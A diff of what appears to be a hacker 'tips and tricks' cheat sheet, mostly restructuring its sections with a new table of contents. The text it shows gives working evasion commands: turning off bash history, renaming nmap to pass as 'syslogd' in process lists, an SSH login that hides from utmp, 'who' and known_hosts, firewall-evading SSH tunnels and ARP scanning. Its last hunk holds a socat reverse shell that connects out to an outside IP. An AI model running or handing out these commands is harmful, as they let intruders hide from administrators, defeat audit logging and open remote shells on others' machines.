@@ -6,9 +6,21 @@ We show the tricks 'as is' without any explanation why they work. You need to kn
 
 Got tricks? Send them to root@thc.org or submit a pull request.
 
-[follow this to ssh](#ais-anchor)
+1. [Bash](#lbwh-anchor)
+   1. [Leave Bash without history](#lbwh-anchor)
+   1. [Hide your command](#hyc-anchor)
+   1. [Hide your arguments](#hya-anchor)
 
-**1. Leave Bash without history:**
+2. [SSH](#ais-anchor)
+   1. [Almost invisible SSH](#ais-anchor)
+   1. [SSH tunnel OUT](#sto-anchor)
+   1. [SSH tunnel IN](#sti-anchor)
+3. [Network](#network-anchor)
+   1. [ARP discover computers on the local network](#adln-anchor)
+
+---
+<a id="lbwh-anchor"></a>
+**1.i. Leave Bash without history:**
 
 Tell Bash that there is no history file (*~/.bash_history*). This is the first command we execute on every shell. It will stop the Bash from logging your commands.
 
@@ -25,31 +37,8 @@ Note: Any command starting with a " " (space) will [not get logged to history](h
 ```
 $  id
 ```
-
-<a id="ais-anchor"></a>
-**2. Almost invisible SSH**
-```
-$ ssh -o UserKnownHostsFile=/dev/null -T user@host.org "bash -i"
-```
-This will not add your user to the */var/log/utmp* file and you wont show up in *w* or *who* command of logged in users. It will bypass .profile and .bash_profile as well. On your client side it will stop logging the host name to *~/.ssh/known_hosts*.
-
-**3. SSH tunnel OUT**
-
-We use this all the time to circumvent local firewalls or IP filtering:
-```
-$ ssh -g -L31337:1.2.3.4:80 user@host.org
-```
-You or anyone else can now connect to your computer on port 31337 and gets connected to 1.2.3.4:80 and appearing from host 'host.org'
-
-**4. SSH tunnel IN**
-
-We use this to give access to a friend to an internal machine that is not on the public Internet:
-```
-$ ssh -o ExitOnForwardFailure=yes -g -R31338:192.168.0.5:80 user@host.org
-```
-Anyone connecting to host.org:31338 will get connected to the compuyter 192.168.0.5 on port 80 via your computer.
-
-**5. Hide your command**
+<a id="hyc-anchor"></a>
+**1.ii. Hide your command**
 
 ```
 $ cp `which nmap` syslogd
@@ -57,11 +46,40 @@ $ PATH=.:$PATH syslogd -T0 10.0.2.1/24
 ```
 In this example we execute *nmap* but let it appear with the name *syslogd* in *ps alxwww* process list.
 
-**6. Hide your arguments**
+<a id="hya-anchor"></a>
+**1.iii. Hide your arguments**
 
 Continuing from above..FIXME: can this be done witout LD_PRELOAD and just in Bash?
 
-**7. ARP discover computers on the local network**
+
+<a id="ais-anchor"></a>
+**2.i. Almost invisible SSH**
+```
+$ ssh -o UserKnownHostsFile=/dev/null -T user@host.org "bash -i"
+```
+This will not add your user to the */var/log/utmp* file and you wont show up in *w* or *who* command of logged in users. It will bypass .profile and .bash_profile as well. On your client side it will stop logging the host name to *~/.ssh/known_hosts*.
+
+<a id="sto-anchor"></a>
+**2.ii SSH tunnel OUT**
+
+We use this all the time to circumvent local firewalls or IP filtering:
+```
+$ ssh -g -L31337:1.2.3.4:80 user@host.org
+```
+You or anyone else can now connect to your computer on port 31337 and gets connected to 1.2.3.4:80 and appearing from host 'host.org'
+
+<a id="sti-anchor"></a>
+**2.iii SSH tunnel IN**
+
+We use this to give access to a friend to an internal machine that is not on the public Internet:
+```
+$ ssh -o ExitOnForwardFailure=yes -g -R31338:192.168.0.5:80 user@host.org
+```
+Anyone connecting to host.org:31338 will get connected to the compuyter 192.168.0.5 on port 80 via your computer.
+
+<a id="network-anchor"></a>
+<a id="adln-anchor"></a>
+**3. ARP discover computers on the local network**
 ```
 $ nmap -r -sn -PR 192.168.0.1/24
 ```
@@ -398,5 +416,5 @@ socat file:`tty`,raw,echo=0 tcp-listen:1524
 socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:3.13.3.7:1524
 ```
 
---------------------------------------------------------------------------
+---
 Shoutz: ADM
